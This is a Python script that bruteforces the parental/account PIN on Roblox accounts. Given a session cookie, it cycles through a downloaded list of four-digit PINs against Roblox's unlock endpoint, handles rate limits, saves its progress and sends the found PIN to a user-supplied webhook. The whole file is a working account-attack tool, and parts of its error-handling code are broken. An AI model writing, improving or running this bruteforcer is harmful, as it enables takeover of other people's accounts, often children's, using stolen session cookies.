import subprocess, requests, base64, json, time, os

try:
    from termcolor import cprint
except:
    print("[", end="")
    print('\033[31m'+" ERROR ", "red", end="")
    print("] " , end="")
    print('\033[31m'+"Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
finally:
    from termcolor import cprint

os.system("")

class Crack:
    def __init__(self):
        self.cookie = None
        self.headers = None
        self.continueProgress = None
        self.start()

    def diagnose(error):
        uiprint = Crack.print
        uiprint(f"ERROR {error}", "error")
        try:
            cookie = self.cookie
            headers = {
                'X-CSRF-TOKEN': self.getXsrf(cookie),
            }
            print("[", end="")
            cprint(" ERROR ", "red", end="")
            print("] " , end="")
            cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')

            check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
            response = check.json()

            if check.status_code ==503:
                uiprint("Error found. Roblox is under maintenence", "error")

            elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                uiprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "error")

            elif response['errors'][0]['message'] == 'Token Validation Failed':
                uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")

            elif check.status_code ==404:
                uiprint("Error found. Roblox's api endpoint may have changed", "error")

            uiprint("Try re-running the program", 'error')
        except:
            uiprint(f"Error occured with the program or your computer.", "error")

    def print(self, message=None, type=None):
        key = {
          "error": ["ERROR", "red"],
          "diagnostic": ["DIAGNOSTIC", "red"],
          "ratelimit": ["RATELIMITED", "yellow"],
          None: ["BRUTEFORCER", "magenta"],

        }

        if type in key:
            title = key[type][0]
            color = key[type][1]
        else:
            title = "BRUTEFORCER"
            color = type

        print("[", end="")
        cprint(f" {title} ", color, end="")
        print("] " , end="")
        if message:
            print(message)

    def getXsrf(self, cookie):
        xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
                '.ROBLOSECURITY': cookie
        })
        return xsrfRequest.headers["x-csrf-token"]
            
    def clear(self):
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")

    def check(self):
        uiprint = self.print
        yes = ["y", "yes", "yeah", "ye"]

        uiprint(" Enter Your Cookie Below:")

        cookie = input("> ")
        uiprint(" Enter Your Webhook Below:")

        webhook = input("> ")
        uiprint(" Continue progress from last time? (Y or N)")

        continueProgress = input("> ")
        if not continueProgress or continueProgress.lower() in yes:
            continueProgress = True
        else:
            continueProgress = False

        check = requests.get('https://friends.roblox.com/v1/user/friend-requests/count', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
        print(check)  
        if not check.status_code == 200:
            uiprint("Invalid Cookie", "error")
            time.sleep(1)
            self.clear()
            self.check()

        self.cookie = cookie
        self.webhook = webhook
        self.continueProgress = continueProgress

    def start(self):
        uiprint = self.print
        print("[", end="")
        cprint(base64.b64decode(b'IENSRURJVFMg').decode('utf-8'), "cyan", end="")
        print("]", end="")
        print(base64.b64decode(b'IE1hZGUgYnkgSWNlIEJlYXIjMDE2Nw==').decode('utf-8'))
        time.sleep(3)
        self.clear()

        self.check()
        continueProgress = self.continueProgress
        cookie = self.cookie
        # --({ Check for files }) -- #
        if not os.path.exists("progress.json"):

            uiprint("Missing progress.json", "error")
            time.sleep(1)

            uiprint("Creating file now...")
            open("progress.json", "w+").write("{\n\n}")
            uiprint("Done")
            time.sleep(1)

        uiprint()

        for char in 'Cracking the pin....':
            time.sleep(0.03)
            cprint(char, 'magenta', end='', flush=True)
            
        print("")
        uiprint()
        for char in 'Leave this running for about around 2 days':
            time.sleep(0.03)
            cprint(char, 'magenta', end='', flush=True)
        cookies = {
        '.ROBLOSECURITY': cookie
        }
        userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
        time.sleep(1)
        self.clear()
        if continueProgress:
            try:
                startingLine = json.load(open("progress.json", "r"))[str(userid)]
            except KeyError:
                uiprint(f"There is no progress saved inside for this account progress.json", 'error')

                time.sleep(4)
                self.clear()
                self.check()
            except json.JSONDecodeError:
                uiprint(f"The data inside progress.json is not a json. Redownload the file from the github", 'error')

                time.sleep(4)
                self.clear()
                self.check()
            pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
        else:
            startingLine = 0
            pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]

        for line, pin in enumerate(pins):
            uiprint(f"Trying {pin}...")

            progress = json.load(open("progress.json", "r"))
            with open("progress.json", "w+") as f:
                progress[str(userid)] = int(line+startingLine)
                json.dump(progress, f, indent=1)

            pin = pins[line]
            # --({ Check if the pin was found }) -- #
            printed = False

            while True:

                try:
                    request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
                    'X-CSRF-TOKEN': self.getXsrf(cookie),
                }, data={'pin': pin}, cookies=cookies)
                except Exception as e:
                    continue
                
                response = request.json()
                status_code = request.status_code

                try:
                        if "unlockedUntil" in str(response):
                            uiprint("Cookie:", 'cyan')

                            print(cookie)
                            uiprint(f"Pin found: {pin}", 'green')

                            r = requests.post(self.webhook, data={'content':pin})
                            if not r.status_code ==200:
                                print("[", end="")
                                cprint("ERROR", end="")
                                print("] " , end="")

                                cprint('Invalid Webhook', 'red')
                            os.system("PAUSE")

                        if response['errors'][0]['code'] == 4:
                            uiprint("Incorrect Pin", 'red')
                            printed = False
                            break

                        elif response['errors'][0]['message'] == "Too many requests":
                            if not printed:
                                start = time.time()
                                uiprint(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                printed = True

                            time.sleep(60)
                            continue

                        if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                            uiprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")

                            time.sleep(5)
                            os.system("PAUSE")
                            exit()

                        elif response['errors'][0]['message'] == 'Token Validation Failed':
                            uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
                            time.sleep(5)
                            os.system("PAUSE")
                            exit()

                except Exception as e:
                    print(f"A error has occured {e}")
        else:
            uiprint("Invalid Cookie", 'error')



# --({ Start program }) -- #
if __name__ == "__main__":
    try:
        Crack()
    except Exception as e:
        print(e)
        Crack.diagnose(e)
